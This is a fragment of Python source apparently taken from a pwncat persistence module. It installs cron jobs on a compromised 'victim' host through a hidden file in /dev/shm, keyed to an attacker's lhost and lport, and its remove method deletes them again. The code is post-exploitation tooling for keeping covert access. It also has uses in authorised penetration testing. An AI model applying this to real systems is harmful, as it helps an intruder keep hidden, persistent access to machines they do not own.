            ...
            for number in schedule.split():
                ...
                if str("no crontab") in str(user_entries):
                    ...
                    with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
                        ...
                        flip.write(f"{job}\n")
                pwncat.victim.env(["sed", "-i", "'/^$/d'", "/dev/shm/.pwncron"])
    ...
    def remove(self, user, lhost, lport, schedule, shell):
        ...
        if schedule != "" and lhost != "" and lport != "":
            ...
            for number in schedule.split():
                ...
                #with pwncat.victim.open("/dev/shm/.pwncron", "w") as flip:
                #   for line in flip.lines:
                #        if line.strip() != str(f"{job}"):
                #            flip.write(line)

                pwncat.victim.run("grep -v " + str(lhost) + " /dev/shm/.pwncron | grep -v " + str(lport) + " | grep -v '" + str(schedule) + "' | crontab; crontab -l | grep -qi [a-zA-Z0-9] || crontab -r").strip().decode("utf-8")
                #pwncat.victim.env(["crontab", "/dev/shm/.pwncron"])
